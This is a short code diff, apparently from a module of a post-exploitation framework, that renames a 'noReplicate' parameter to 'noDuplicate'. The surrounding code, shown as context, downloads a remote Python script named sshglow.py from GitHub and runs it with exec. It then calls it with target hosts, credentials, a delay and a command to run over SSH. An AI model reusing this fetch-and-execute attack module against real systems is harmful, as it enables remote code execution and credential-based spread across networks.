@@ -15,7 +15,7 @@ class Module(object):
         targets = params['Targets']
         creds = params['Creds']
         delay = params['Delay']
-        noReplicate = 'True' if params['noReplicate'].lower() == 'true' else 'False'
+        noDuplicate = 'True' if params['noDuplicate'].lower() == 'true' else 'False'
         command = params['Command']
         language = params['Language']
         listenerName = params['Listener']
@@ -78,7 +78,7 @@ class Module(object):
             from urllib.request import urlopen
             try:
                 exec(urlopen("https://raw.githubusercontent.com/abdallah-elsharif/sshglow/main/sshglow.py").read().decode("utf-8"),globals())
-                run("{targets}","{creds}",delay={delay},no_replicate={noReplicate},cmd="{cmd}")
+                run("{targets}","{creds}",delay={delay},no_duplicate={noDuplicate},cmd="{cmd}")
             except urllib.error.URLError:
                 print("\033[0;31m[!]\033[0;37m We need internet access to load SSHGlow")
             except Exception as e:
